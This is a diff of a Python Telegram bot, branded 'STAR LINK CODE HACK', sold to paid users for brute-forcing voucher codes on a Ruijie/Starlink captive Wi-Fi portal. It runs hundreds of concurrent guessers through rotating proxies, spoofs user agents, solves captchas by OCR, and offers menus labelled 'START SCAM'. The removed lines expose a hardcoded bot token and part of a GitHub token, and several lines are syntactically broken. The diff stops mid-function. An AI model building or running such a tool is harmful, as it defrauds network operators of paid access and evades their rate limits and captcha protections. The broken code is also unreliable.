@@ -1,1689 +1,1820 @@
-import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
-from telebot.async_telebot import AsyncTeleBot
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
-from aiohttp import web
-import cv2
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+==========================================================================
+⚡ RUIJIE ASYNC EXTREME ⚡
+ Starlink Voucher Scanner + Telegram Bot  |  Telegram https://t.me/mzw199761
+--------------------------------------------------------------------------
+ FULL FEATURES MAINTAINED (LOGIC UNCHANGED)
+ REGULAR TEXT PROSE AND UI FORMATTED TO THE
+ STRICTLY NO MYANMAR TEXT .
+==========================================================================
+"""
+
+import os
+import sys
+import re
+import json
+import time
+import random
+import string
+import hashlib
+import asyncio
+import datetime
+
+from urllib.parse import urljoin
+
+import aiohttp
+from aiohttp_socks import ProxyConnector, ProxyType
+
 import ddddocr
-import numpy as np
-from datetime import datetime, timedelta, timezone
 
-# ==================== CONFIGURATION ====================
-BOT_TOKEN = "8858819080:AAEj3LqTpGUY3NLUZE39AamdhWikJAvuoiI"
-GITHUB_TOKEN = 'ghp_oHKfjx038C18yM9V'
-REPO_OWNER = "MZW"
-REPO_NAME = "codehack"
+from telegram import (
+    Update,
+    InlineKeyboardButton,
+    InlineKeyboardMarkup,
+)
+from telegram.constants import ParseMode
+from telegram.ext import (
+    Application,
+    CommandHandler,
+    MessageHandler,
+    CallbackQueryHandler,
+    ContextTypes,
+    filters,
+)
 
-ADMINS = "7294591323"
+# ==============================================================================
+#  CONFIG
+# ==============================================================================
 
-ADMIN_USERNAME = "@mzw199761"
+BOT_TOKEN = os.environ.get('BOT_TOKEN')
 
-def is_admin(user_id):
-    return str(user_id) in ADMINS
+ADMIN_IDS = os.environ.get('ADMIN_IDS', '')
 
-PROXY_LIST = [
-    "socks4://129.151.240.183:1080",
-    
+# ==============================================================================
+#  FILE PATHS
+# ==============================================================================
+
+FILE_PATH = "allinone.txt"
+LAST_RUN_FILE = "last_run.txt"
+PROXY_FILE = "proxies.txt"
+PORTAL_URL_PATH = "portal_url_"
+PAID_KEYS_FILE = "paid_keys.txt"
+OWNER_LICENSE_FILE = "owner_license.txt"
+
+# ==============================================================================
+#  ⚡ SPEED SETTINGS ⚡
+# ==============================================================================
+
+NUM_WORKERS = 250
+MAX_CODES_PER_SESSION = 150
+MAX_CODES_PER_SID = 150
+TIMEOUT_SEC = 20
+
+# Proxy settings
+USE_PROXY = True
+PROXY_TIMEOUT = 15
+MAX_BAD_PROXIES = 50
+PROXY_MAX_FAILS = 10
+
+# ==============================================================================
+#  PORTAL ENDPOINTS
+# ==============================================================================
+
+PORTAL_BASE = "https://portal-as.ruijienetworks.com"
+PORTAL_INDEX = PORTAL_BASE + "/download/static/maccauth/src/index.html"
+PORTAL_BALANCE_PAGE = PORTAL_BASE + "/download/static/maccauth/src/balance.html?sessionId="
+VOUCHER_URL = PORTAL_BASE + "/api/auth/voucher/?lang=en_US"
+CAPTCHA_IMAGE_URL = PORTAL_BASE + "/api/auth/captcha/image"
+CAPTCHA_VERIFY_URL = PORTAL_BASE + "/api/auth/captcha/verify"
+BALANCE_API = PORTAL_BASE + "/api/auth/balance/getBalance/"
+
+# ==============================================================================
+#  CHARSETS
+# ==============================================================================
+
+CHARSET_DIGITS = "0123456789"
+CHARSET_ABC = "abcdefghijkmnopqrstuvwxyz"
+CHARSET_MIX = "0123456789abcdefghijklmnopqrstuvwxyz"
+
+_CHARSET_DIGITS_T = tuple(CHARSET_DIGITS)
+_CHARSET_ABC_T = tuple(CHARSET_ABC)
+_CHARSET_MIX_T = tuple(CHARSET_MIX)
+
+MODES = {
+    "num6": "💠 06 • NUM",
+    "num7": "💠 07 • NUM",
+    "num8": "💠 08 • NUM",
+    "num9": "💠 09 • NUM",
+    "eng6": "❄️06 • ENG",
+    "eng7": "❄️07 • ENG",
+    "eng8": "❄️ 08 • ENG",
+    "mix6": "Ⓜ️ 06 • MIX",
+    "mix7": "Ⓜ️ 07 • MIX",
+    "mix8": "Ⓜ️ 08 • MIX",
+    "abc6": "🆎 06 • ABC",
+    "custom": 📝" Custom",
+}
+
+# ==============================================================================
+#  COLORS
+# ==============================================================================
+
+bred = "\x1b[1;31m"
+bgreen = "\x1b[1;32m"
+bcyan = "\x1b[1;36m"
+white = "\x1b[37m"
+yellow = "\x1b[33m"
+reset = "\x1b[0m"
+
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
 ]
 
-
-_proxy_index = 0
-def get_next_proxy():
-    global _proxy_index
-    if not PROXY_LIST:
-        return None
-    proxy = PROXY_LIST[_proxy_index % len(PROXY_LIST)]
-    _proxy_index += 1
-    return f"http://{proxy}"
-
-SUCCESS_CODE = asyncio.Queue()
-bot = AsyncTeleBot(BOT_TOKEN)
-user_data = {}
-approve = {}
-scan_tasks = {}
-success_messages = {}
-success_texts = {}
-limited_messages = {}
-limited_texts = {}
-captcha_state = {}
-session = None
-_connector = None
-CONCURRENCY = 1000
-_voucher_sem = None
-_start_time = time.monotonic()
-
-MAX_CONCURRENT_SCANS = 40
-active_scans_count = 0
-active_scans_lock = asyncio.Lock()
-
+_ocr_instance = None
+_proxy_manager = None
+user_scanners = {}
 paid_users = {}
 
-async def handle(request):
-    return web.Response(text="Bot is awake and running 24/7!")
 
-async def web_server():
-    app = web.Application()
-    app.router.add_get('/', handle)
-    runner = web.AppRunner(app)
-    await runner.setup()
-    port = int(os.environ.get('BOT_PORT', 8099))
-    site = web.TCPSite(runner, '0.0.0.0', port)
-    await site.start()
+# ==============================================================================
+#  AUTO-CREATE FILES
+# ==============================================================================
 
-async def get_file_content(path):
-    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
-    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
-    async with session.get(url, headers=headers) as response:
-        if response.status == 200:
-            data = await response.json()
-            content = base64.b64decode(data['content']).decode('utf-8')
-            return json.loads(content), data['sha']
-    return {}, None
-
-async def update_file_content(path, content, sha, message):
-    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
-    headers = {
-        "Authorization": f"token {GITHUB_TOKEN}",
-        "Content-Type": "application/json"
+def ensure_files_exist():
+    files = {
+        FILE_PATH: "",
+        PROXY_FILE: "",
+        LAST_RUN_FILE: datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+        PAID_KEYS_FILE: "# Format: <key_hash>:<expiry>:<plan>:<signature>\n",
     }
-    encoded = base64.b64encode(json.dumps(content).encode()).decode()
-    payload = {
-        "message": message,
-        "content": encoded,
-        "sha": sha
-    }
-    async with session.put(url, headers=headers, json=payload) as response:
-        return await response.text()
+    for fname, content in files.items():
+        if not os.path.exists(fname):
+            try:
+                with open(fname, "w") as f:
+                    f.write(content)
+                print(bgreen + f"[AutoCreate] Created {fname}" + reset)
+            except OSError as e:
+                print(bred + f"[AutoCreate] Error: {e}" + reset)
 
-def get_main_keyboard():
-    keyboard = InlineKeyboardMarkup(row_width=2)
-    keyboard.add(
-        InlineKeyboardButton("🎫 PAID USER", callback_data="menu_paid"),
-        InlineKeyboardButton("🔗 STAR LINK Portal URL ထည့်ရန်", callback_data="menu_free_trial"),
-        InlineKeyboardButton("📋 Success Codes ကြည့်မည်", callback_data="menu_result"),
-        InlineKeyboardButton("🔄 Recheck ပြန်လုပ်စစ်မည်", callback_data="menu_recheck"),
-        InlineKeyboardButton("🛑 Scan ရပ်မည်", callback_data="menu_stop"),
-        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
-    )
-    return keyboard
 
-def get_voucher_keyboard():
-    keyboard = InlineKeyboardMarkup(row_width=2)
-    keyboard.add(
-        InlineKeyboardButton("🔢 VOUCHER 6 လုံး", callback_data="scan_6"),
-        InlineKeyboardButton("🔢 VOUCHER 7 လုံး", callback_data="scan_7"),
-        InlineKeyboardButton("🔢 VOUCHER 8 လုံး", callback_data="scan_8"),
-        InlineKeyboardButton("🔢 VOUCHER 9 လုံး", callback_data="scan_9"),
-        InlineKeyboardButton("🔤 VOUCHER ascii-lower", callback_data="scan_ascii-lower"),
-        InlineKeyboardButton("🔤 VOUCHER ascii-lower 9လုံး", callback_data="scan_ascii-lower9"),
-        InlineKeyboardButton("🎲 VOUCHER all", callback_data="scan_all"),
-        InlineKeyboardButton("🔤+🔢 MIXED 6လုံး", callback_data="scan_mixed"),
-        InlineKeyboardButton("🔤+🔢 MIXED 8လုံး", callback_data="scan_mixed8"),
-        InlineKeyboardButton("🔤+🔢 MIXED 9လုံး", callback_data="scan_mixed9"),
-        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
-    )
-    return keyboard
+# ==============================================================================
+#  BANNER / LICENSE
+# ==============================================================================
 
-def get_digit_keyboard(mode):
-    keyboard = InlineKeyboardMarkup(row_width=5)
-    buttons = []
-    for i in range(10):
-        buttons.append(InlineKeyboardButton(str(i), callback_data=f"digit_{mode}_{i}"))
-    keyboard.add(*buttons)
-    keyboard.add(InlineKeyboardButton("🎲 Random", callback_data=f"digit_{mode}_random"))
-    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
-    return keyboard
+def show_banner():
+    line = "═" * 60
+    print(bred + line)
+    print("   ⚔️  Thank You For Use  ⚔️   ")
+    print("            Telegram @mzw199761  ")
+    print(line + reset)
+    print(white + "Summoning  & verifying domain authorization..." + reset)
 
-def get_start_scam_keyboard():
-    keyboard = InlineKeyboardMarkup(row_width=1)
-    keyboard.add(
-        InlineKeyboardButton("🚀 START SCAM", callback_data="menu_start_scam"),
-        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
-    )
-    return keyboard
 
-def get_paid_keyboard():
-    keyboard = InlineKeyboardMarkup(row_width=1)
-    keyboard.add(
-        InlineKeyboardButton("✅ PAID USER ဖြစ်ရန်", callback_data="menu_enter_userid"),
-        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
-    )
-    return keyboard
+def encrypt_key_data(key_str, expiry_str):
+    return hashlib.sha256(f"{key_str}:{expiry_str}".encode()).hexdigest()
 
-def get_back_keyboard():
-    keyboard = InlineKeyboardMarkup(row_width=1)
-    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
-    return keyboard
 
-def get_scam_button_keyboard():
-    keyboard = InlineKeyboardMarkup(row_width=1)
-    keyboard.add(
-        InlineKeyboardButton("🛑 STOP SCAM", callback_data="menu_stop"),
-        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
-    )
-    return keyboard
-
-@bot.message_handler(commands=['start'])
-async def start(message):
-    user_id = str(message.chat.id)
-    user_name = message.from_user.first_name or message.from_user.username or "User"
-    
-    if message.chat.id not in user_data:
-        user_data[message.chat.id] = {}
-    
-    if user_id in paid_users or user_id in approve:
-        approve[message.chat.id] = True
-        welcome_text = f"""✨ STAR LINK CODE HACK ✨
-
-🪪 NAME: {user_name}
-📜 USER ID: {user_id}
-
-🎁 မင်္ဂလာပါခင်ဗျာ! 
-🎫 သင့်အနေနဲ့ PAID USER ဖြစ်ပါတယ်။
-♾️ Unlimited Credit ဖြင့် သုံးစွဲနိုင်ပါသည်။
-
-အောက်ပါ Menu မှ သင်လိုချင်တာကိုရွေးချယ်ပါ။"""
-    else:
-        welcome_text = "✨ STAR LINK CODE HACK ✨"
-
-🪪 NAME: {user_name}
-📜 USER ID: {user_id}
-
-⚠️ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။
-
-PAID USER ဖြစ်ရန် အောက်ပါ Menu မှ PAID USER ကိုနှိပ်ပါ။
-👨‍💻 "Admin:@mzw199761"
-    
-    await bot.send_message(message.chat.id, welcome_text, reply_markup=get_main_keyboard())
-
-@bot.message_handler(commands=['sendall'])
-async def send_all_broadcast(message):
-    if not is_admin(message.chat.id):
-        return
-    
-    args = message.text.split(maxsplit=1)
-    if len(args) < 2:
-        await bot.reply_to(message, "Usage: /sendall [your_message]")
-        return
-    
-    broadcast_text = f"📢 ADMIN NOTIFICATION\n\n{args[1]}"
-    auth_list, _ = await get_file_content("auth_list.json")
-    
-    count = 0
-    for uid in auth_list:
+def check_time_integrity():
+    now = datetime.datetime.now()
+    last_run_time = None
+    if os.path.exists(LAST_RUN_FILE):
         try:
-            await bot.send_message(int(uid), broadcast_text)
-            count += 1
-            await asyncio.sleep(0.1)
-        except:
-            continue
-            
-    await bot.reply_to(message, f"✅ User {count} ယောက်ထံသို့ စာပို့ပြီးပါပြီ။")
-
-@bot.callback_query_handler(func=lambda call: True)
-async def callback_handler(call):
-    chat_id = call.message.chat.id
-    user_id = str(chat_id)
-    user_name = call.from_user.first_name or call.from_user.username or "User"
-    
-    if call.data == "menu_back":
-        if user_id in paid_users or user_id in approve:
-            text = f"""✨ STAR LINK CODE HACK ✨
-
-🪪 NAME: {user_name}
-📜 USER ID: {user_id}
-
-🎫 PAID USER - Unlimited Access"""
-        else:
-            text = f"""✨ STAR LINK CODE HACK ✨
-
-🪪 NAME: {user_name}
-📜 USER ID: {user_id}
-
-⚠️ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။
-
-PAID USER ဖြစ်ရန် အောက်ပါ Menu မှ PAID USER ကိုနှိပ်ပါ။"""
-        
-        await bot.edit_message_text(
-            chat_id=chat_id,
-            message_id=call.message.message_id,
-            text=text,
-            reply_markup=get_main_keyboard()
-        )
-        await bot.answer_callback_query(call.id)
-        return
-    
-    if call.data == "menu_free_trial":
-        if user_id not in paid_users and user_id not in approve:
-            await bot.edit_message_text(
-                chat_id=chat_id,
-                message_id=call.message.message_id,
-                text=f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
-                reply_markup=get_back_keyboard()
-            )
-            await bot.answer_callback_query(call.id)
-            return
-        
-        text = f"""🔗 Portal URL ထည့်သွင်းရန်:
-
-/portal [your_portal_url]
-
-ဥပမာ:
-/portal https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00
-
-Portal URL အသစ်ထည့်ပါက ယခင် URL ပျက်သွားမည်ဖြစ်သည်။"""
-        
-        await bot.edit_message_text(
-            chat_id=chat_id,
-            message_id=call.message.message_id,
-            text=text,
-            reply_markup=get_back_keyboard()
-        )
-        await bot.answer_callback_query(call.id)
-        return
-    
-    if call.data == "menu_start_scam":
-        if user_id not in paid_users and user_id not in approve:
-            await bot.edit_message_text(
-                chat_id=chat_id,
-                message_id=call.message.message_id,
-                text=f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin {@mzw199761} သို့ ဆက်သွယ်ပါ။",
-                reply_markup=get_back_keyboard()
-            )
-            await bot.answer_callback_query(call.id)
-            return
-        
-        global active_scans_count, active_scans_lock
-        async with active_scans_lock:
-            if active_scans_count >= MAX_CONCURRENT_SCANS:
-                await bot.edit_message_text(
-                    chat_id=chat_id,
-                    message_id=call.message.message_id,
-                    text=f"⚠️ Bot အလုပ်များနေပါသည်။ လက်ရှိ {active_scans_count}/{MAX_CONCURRENT_SCANS} ယောက် scan လုပ်နေပါသည်။\n\nခဏစောင့်ပြီးမှ ထပ်ကြိုးစားပါ။",
-                    reply_markup=get_back_keyboard()
-                )
-                await bot.answer_callback_query(call.id)
-                return
-            active_scans_count += 1
-        
-        if chat_id not in user_data or 'selected_mode' not in user_data.get(chat_id, {}):
-            await bot.edit_message_text(
-                chat_id=chat_id,
-                message_id=call.message.message_id,
-                text="❌ VOUCHER အမျိုးအစားမရွေးရသေးပါ။ ကျေးဇူးပြု၍ VOUCHER အရင်ရွေးပါ။",
-                reply_markup=get_voucher_keyboard()
-            )
-            await bot.answer_callback_query(call.id)
-            return
-        
-        mode = user_data[chat_id]['selected_mode']
-        start_digit = user_data[chat_id].get('start_digit')
-        
-        if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
-            await bot.edit_message_text(
-                chat_id=chat_id,
-                message_id=call.message.message_id,
-                text="🔗 ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n/portal [your_portal_url]",
-                reply_markup=get_back_keyboard()
-            )
-            await bot.answer_callback_query(call.id)
-            return
-        
-        if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
-            await bot.edit_message_text(
-                chat_id=chat_id,
-                message_id=call.message.message_id,
-                text="Scan သည် အလုပ်လုပ်နေပြီဖြစ်သည်။ STOP SCAM ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။",
-                reply_markup=get_scam_button_keyboard()
-            )
-            await bot.answer_callback_query(call.id)
-            return
-        
-        await bot.edit_message_text(
-            chat_id=chat_id,
-            message_id=call.message.message_id,
-            text=f"🔍 Scan စတင်နေပါသည်...\n\n🔢 VOUCHER Mode: {mode}\n\nSTOP SCAM ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။",
-            reply_markup=get_scam_button_keyboard(),
-            parse_mode="Markdown"
-        )
-        
-        progress_msg = await bot.send_message(chat_id, "🔍 Voucher Codeရှာဖွေနေသည်...\n\n")
-        scan_id = str(uuid.uuid4())
-        
-        try:
-            portal_url = user_data[chat_id].get('session_url', 'Unknown')
-            last_url = user_data[chat_id].get('last_admin_notified_url', '')
-            
-            if portal_url != last_url and portal_url != 'Unknown':
-                admin_msg = f"🚀 **Scan Start Notification**\n\n🪪 **User:** {user_name}\n📜 **User ID:** `{user_id}`\n🔢 **Mode:** {mode}\n🔗 **Portal URL:**\n`{portal_url}`"
-                for admin_id in ADMINS:
-                    try:
-                        await bot.send_message(admin_id, admin_msg, parse_mode="Markdown")
-                    except:
-                        pass
-                user_data[chat_id]['last_admin_notified_url'] = portal_url
-        except Exception as e:
-            print(f"Admin Notification Error: {e}")
-
-        task = asyncio.create_task(
-            run_bruteforce(
-                mode,
-                chat_id,
-                user_data[chat_id]['session_url'],
-                scan_id,
-                message=call.message,
-                progress_msg=progress_msg,
-                start_digit=start_digit
-            )
-        )
-        
-        scan_tasks[chat_id] = {
-            "task": task,
-            "stop": False,
-            "scan_id": scan_id
-        }
-        
-        await bot.answer_callback_query(call.id)
-        return
-    
-    if call.data == "menu_paid":
-        text = f"""🔑 PAID USER ဖြစ်ရန်
-
-ကျေးဇူးပြု၍ သင်၏ USER ID ကိုထည့်သွင်းပါ။
-
-USER ID: {user_id}
-
-✅ သင်၏ USER ID ကို Admin ထံ ပေးပို့ပြီး Key ဝယ်ယူပါ။
-👨‍💻 Admin: {@mzw199761}
-
-Key ရရှိပြီးပါက PAID USER ဖြစ်ရန် နှိပ်ပါ"""
-        
-        await bot.edit_message_text(
-            chat_id=chat_id,
-            message_id=call.message.message_id,
-            text=text,
-            reply_markup=get_paid_keyboard()
-        )
-        await bot.answer_callback_query(call.id)
-        return
-    
-    if call.data == "menu_enter_userid":
-        auth_list, _ = await get_file_content("auth_list.json")
-        
-        if user_id in auth_list:
-            valid = check_key_expiration(auth_list[user_id])
-            if valid:
-                approve[chat_id] = True
-                paid_users[user_id] = True
-                if chat_id not in user_data:
-                    user_data[chat_id] = {}
-                
-                await bot.edit_message_text(
-                    chat_id=chat_id,
-                    message_id=call.message.message_id,
-                    text=f"✅ PAID USER ဖြစ်ပါပြီ။\n\nUSER ID: {user_id}\n\nအောက်ပါ Menu မှ သင်လိုချင်တာကိုရွေးချယ်ပါ။",
-                    reply_markup=get_main_keyboard()
-                )
-            else:
-                await bot.edit_message_text(
-                    chat_id=chat_id,
-                    message_id=call.message.message_id,
-                    text=f"❌ သင်၏ Key Expired ဖြစ်နေပါသည်။ ကျေးဇူးပြု၍ Admin {@mzw199761} သို့ ဆက်သွယ်ပါ။",
-                    reply_markup=get_back_keyboard()
-                )
-        else:
-            for admin_id in ADMINS:
-                try:
-                    await bot.send_message(
-                        chat_id=admin_id,
-                        text=f"🔔 New User Request:\nName: {user_name}\nID: {user_id}\n\nTo approve:\n/genkey unlimited {user_id}"
-                    )
-                except:
-                    pass
-            
-            await bot.edit_message_text(
-                chat_id=chat_id,
-                message_id=call.message.message_id,
-                text=f"🙏 ကျေးဇူးပြု၍ Paid ဝယ်ယူပါ။\n\nUSER ID: {user_id}\n\nAdmin မှ သင့် ID ကို အတည်ပြုပြီးပါက PAID USER ဖြစ်ပါမည်။\n👨‍💻 Admins: {@mzw199761} & @makxchemistry",
-                reply_markup=get_back_keyboard()
-            )
-        await bot.answer_callback_query(call.id)
-        return
-    
-    if call.data == "menu_result":
-        if user_id not in paid_users and user_id not in approve:
-            await bot.edit_message_text(
-                chat_id=chat_id,
-                message_id=call.message.message_id,
-                text=f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin {@mzw199761} သို့ ဆက်သွယ်ပါ။",
-                reply_markup=get_back_keyboard()
-            )
-            await bot.answer_callback_query(call.id)
-            return
-        
-        results, _ = await get_file_content("result.json")
-        if user_id in results and results[user_id]:
-            codes = "\n".join(results[user_id])
-            text = f"✅ Found Codes:\n{codes}"
-        else:
-            text = "📋 သင့်တွင် ယခင်ကရရှိထားသော success code မရှိသေးပါ။"
-        
-        await bot.edit_message_text(
-            chat_id=chat_id,
-            message_id=call.message.message_id,
-            text=text,
-            reply_markup=get_back_keyboard()
-        )
-        await bot.answer_callback_query(call.id)
-        return
-    
-    if call.data == "menu_recheck":
-        if user_id not in paid_users and user_id not in approve:
-            await bot.edit_message_text(
-                chat_id=chat_id,
-                message_id=call.message.message_id,
-                text=f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
-                reply_markup=get_back_keyboard()
-            )
-            await bot.answer_callback_query(call.id)
-            return
-        
-        if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
-            await bot.edit_message_text(
-                chat_id=chat_id,
-                message_id=call.message.message_id,
-                text="🔗 ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n/portal [your_portal_url]",
-                reply_markup=get_back_keyboard()
-            )
-            await bot.answer_callback_query(call.id)
-            return
-        
-        await bot.edit_message_text(
-            chat_id=chat_id,
-            message_id=call.message.message_id,
-            text="🔄 Recheck ကို စတင်နေပါသည်...",
-            reply_markup=get_scam_button_keyboard()
-        )
-        await recheck_command(call.message)
-        await bot.answer_callback_query(call.id)
-        return
-    
-    if call.data == "menu_stop":
-        await stop_scan_command(call.message)
-        await bot.answer_callback_query(call.id, "🛑 Scan ကိုရပ်တန့်လိုက်ပါပြီ။", show_alert=True)
-        return
-    
-    if call.data.startswith("scan_"):
-        if user_id not in paid_users and user_id not in approve:
-            await bot.edit_message_text(
-                chat_id=chat_id,
-                message_id=call.message.message_id,
-                text=f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin {@mzw199761} သို့ ဆက်သွယ်ပါ။",
-                reply_markup=get_back_keyboard()
-            )
-            await bot.answer_callback_query(call.id)
-            return
-        
-        mode = call.data.replace("scan_", "")
-        
-        if chat_id not in user_data:
-            user_data[chat_id] = {}
-        
-        if 'session_url' not in user_data[chat_id]:
-            await bot.edit_message_text(
-                chat_id=chat_id,
-                message_id=call.message.message_id,
-                text="🔗 ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n/portal [your_portal_url]",
-                reply_markup=get_back_keyboard()
-            )
-            await bot.answer_callback_query(call.id)
-            return
-
-        if mode in ["6", "7", "8", "9"]:
-            await bot.edit_message_text(
-                chat_id=chat_id,
-                message_id=call.message.message_id,
-                text=f"🔢 VOUCHER {mode} လုံးအတွက် ထိပ်စီးနံပါတ်ရွေးပါ -",
-                reply_markup=get_digit_keyboard(mode)
-            )
-            await bot.answer_callback_query(call.id)
-            return
-
-        user_data[chat_id]['selected_mode'] = mode
-        user_data[chat_id]['start_digit'] = None
-        
-        text = f"""🔍 သင်ရွေးချယ်ထားသော VOUCHER အမျိုးအစား: {mode}
-
-✅ START SCAM ခလုတ်ကိုနှိပ်ပြီး စတင်ပါ။
-🛑 STOP SCAM ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။"""
-        
-        await bot.edit_message_text(
-            chat_id=chat_id,
-            message_id=call.message.message_id,
-            text=text,
-            reply_markup=get_start_scam_keyboard()
-        )
-        await bot.answer_callback_query(call.id)
-        return
-
-    if call.data.startswith("digit_"):
-        parts = call.data.split("_")
-        mode = parts[1]
-        digit = parts[2]
-        
-        if chat_id not in user_data:
-            user_data[chat_id] = {}
-        user_data[chat_id]['selected_mode'] = mode
-        user_data[chat_id]['start_digit'] = None if digit == "random" else digit
-        
-        text = f"🔍 VOUCHER Mode: {mode}\n"
-        if digit == "random":
-            text += "🔢 ထိပ်စီးနံပါတ်: Random ဖြစ်ရှာရန်"
-        else:
-            text += f"🔢 ထိပ်စီးနံပါတ်: {digit} မှစ၍ရှာမည်"
-            
-        await bot.edit_message_text(
-            chat_id=chat_id,
-            message_id=call.message.message_id,
-            text=text + "\n\n✅ START SCAM ခလုတ်ကိုနှိပ်ပြီး စတင်ပါ။",
-            reply_markup=get_start_scam_keyboard()
-        )
-        await bot.answer_callback_query(call.id)
-        return
-
-@bot.message_handler(commands=['key'])
-async def handle_key(message):
-    global approve, paid_users
-    args = message.text.split()
-    if len(args) < 2:
-        await bot.reply_to(message, "🔑 ကျေးဇူးပြု၍ သင်၏ KEY ကိုထည့်သွင်းပါ:\n\n/key [your_key_here]")
-        return
-    
-    key = args[1]
-    user_id = str(message.chat.id)
-    
-    auth_list, _ = await get_file_content("auth_list.json")
-    
-    if key == user_id or user_id in auth_list or key in auth_list:
-        valid = True
-        if user_id in auth_list:
-            valid = check_key_expiration(auth_list[user_id])
-        elif key in auth_list:
-            valid = check_key_expiration(auth_list[key])
-        
-        if valid:
-            approve[message.chat.id] = True
-            paid_users[user_id] = True
-            if message.chat.id not in user_data:
-                user_data[message.chat.id] = {}
-            await bot.reply_to(
-                message,
-                f"✅ PAID USER ဖြစ်ပါပြီ။\n\nUSER ID: {user_id}\n\nအောက်ပါ Menu မှ သင်လိုချင်တာကိုရွေးချယ်ပါ။"
-            )
-        else:
-            await bot.reply_to(
-                message,
-                "❌ Key Expired ဖြစ်နေပါသည်။"
-            )
-    else:
-        await bot.reply_to(
-            message,
-            f"❌ သင်၏ key ကို registered မလုပ်ရသေးပါ။\n\nUSER ID: {user_id}\n\nPAID USER ဖြစ်ရန် Admin {@mzw199761} သို့ ဆက်သွယ်ပါ။"
-        )
-
-@bot.message_handler(commands=['listkeys'])
-async def listkeys(message):
-    if not is_admin(message.chat.id):
-        await bot.reply_to(message, "No Permission")
-        return
+            with open(LAST_RUN_FILE) as f:
+                raw_text = f.read().strip()
+            if raw_text:
+                last_run_time = datetime.datetime.strptime(raw_text, "%Y-%m-%d %H:%M:%S")
+        except (OSError, ValueError):
+            last_run_time = None
+    if last_run_time and now < last_run_time:
+        print(bred + "[!] ERROR: TIME ANOMALY / ROLLBACK DETECTED!" + reset)
+        sys.exit(1)
     try:
-        auth_list, _ = await get_file_content("auth_list.json")
-        if not auth_list:
-            await bot.reply_to(message, "Registered key မရှိသေးပါ။")
-            return
-        lines = []
-        for uid, data in auth_list.items():
-            if isinstance(data, dict):
-                expires = data.get("expires_at", "unknown")
-                plan = data.get("plan", "unknown")
-                if expires == "9999-12-31T23:59:59Z":
-                    expires_str = "Unlimited"
-                else:
-                    try:
-                        exp_dt = datetime.fromisoformat(expires.replace("Z", "+00:00"))
-                        now = datetime.now(timezone.utc)
-                        if exp_dt < now:
-                            expires_str = "Expired"
-                        else:
-                            diff = exp_dt - now
-                            days = diff.days
-                            hours, rem = divmod(diff.seconds, 3600)
-                            minutes = rem // 60
-                            expires_str = f"{days}d {hours}h {minutes}m left"
-                    except:
-                        expires_str = expires
-            else:
-                plan = "old"
-                expires_str = str(data)
-            lines.append(f"🪪 {uid}\n   Plan: {plan}\n   Expires: {expires_str}")
-        text = f"📋 Registered Keys ({len(auth_list)})\n\n" + "\n\n".join(lines)
-        if len(text) > 4096:
-            for i in range(0, len(text), 4096):
-                await bot.send_message(message.chat.id, text[i:i+4096])
-        else:
-            await bot.reply_to(message, text)
-    except Exception as e:
-        print(f"Error at listkeys {e}")
+        with open(LAST_RUN_FILE, "w") as f:
+            f.write(now.strftime("%Y-%m-%d %H:%M:%S"))
+    except OSError:
+        pass
 
-@bot.message_handler(commands=['delkey'])
-async def delkey(message):
-    if not is_admin(message.chat.id):
-        await bot.reply_to(message, "No Permission")
-        return
-    try:
-        args = message.text.split()
-        if len(args) < 2:
-            await bot.reply_to(message, "Usage:\n/delkey 123456789")
-            return
-        user_id = args[1]
-        auth_list, sha = await get_file_content("auth_list.json")
-        if user_id not in auth_list:
-            await bot.reply_to(message, f"User ID {user_id} မတွေ့ပါ။")
-            return
-        del auth_list[user_id]
-        await update_file_content(
-            "auth_list.json",
-            auth_list,
-            sha,
-            f"Delete key for {user_id}"
-        )
-        approve.pop(int(user_id), None)
-        paid_users.pop(user_id, None)
-        user_data.pop(int(user_id), None)
-        await bot.reply_to(
